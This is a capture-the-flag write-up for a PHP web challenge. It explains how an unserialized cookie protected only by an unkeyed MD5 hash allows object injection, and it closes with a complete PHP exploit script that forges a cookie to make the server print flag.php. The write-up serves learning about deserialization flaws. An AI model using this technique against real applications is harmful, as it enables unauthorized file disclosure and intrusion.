# Free As In Bavarian Beer

## Details

* Category: web
* Points: 50

## Description

> You have lots of stuff to do?
>
> Better start using this cool tool.
>
> http://104.154.70.126:10888

## Write-up

We are given a link to a page that allows you to create todos. The page also contains a bit of code that allows you to view the source code of the page.

The todos are store in a cookie. If we use the page as is intended, then the data stored in the cookie is an array of strings serialized and deserialized with the functions [serialize](https://secure.php.net/serialize) and [unserialize](https://secure.php.net/unserialize). However, since cookies are client-side we can control the content of the cookie.

The page contains a class that is used to display the source code of the page:

```php
<?php
Class GPLSourceBloater{
    public function __toString()
    {
        return highlight_file('license.txt', true).highlight_file($this->source, true);
    }
}
```

The __toString() method is a [magic method](https://secure.php.net/manual/en/language.oop5.magic.php#object.tostring) which is called if you try to echo an instance of the class. We see that the file that it prints is determined by the property named source.

If the todos cookie is set, then the script will deserialize it and later on it will iterate over the array and echo each element.

```php
<?php
$todos = [];

if(isset($_COOKIE['todos'])){
    $c = $_COOKIE['todos'];
    $h = substr($c, 0, 32);
    $m = substr($c, 32);

    if(md5($m) === $h){
        $todos = unserialize($m);
    }
}
?>

<?php foreach($todos as $todo):?>
    <li><?=$todo?></li>
<?php endforeach;?>
```

Instead of sending an array of strings in the cookie, we can send an array with an instance of GPLSourceBloater where the source property has the value "flag.php". This will cause the contents of the file flag.php to be printed.

We also have to take into consideration that the script checks if the first 32 bytes of the cookie contains an MD5 hash of the serialized data.

Armed with this knowledge we can write a PHP script that crafts a cookie that will cause the contents of flag.php to be displayed.

```php
<?php
Class GPLSourceBloater{
    public function __toString()
    {
        return highlight_file('license.txt', true).highlight_file($this->source, true);
    }
}

$objects = [ new GPLSourceBloater() ];
$objects[0]->source = 'flag.php';

$m = serialize($objects);
$h = md5($m);

$cookie = urlencode($h . $m);

$ch = curl_init();

curl_setopt($ch, CURLOPT_URL, 'http://104.154.70.126:10888/');
curl_setopt($ch, CURLOPT_HTTPHEADER, array('Cookie: todos=' . $cookie));
curl_exec($ch);

curl_close($ch);
```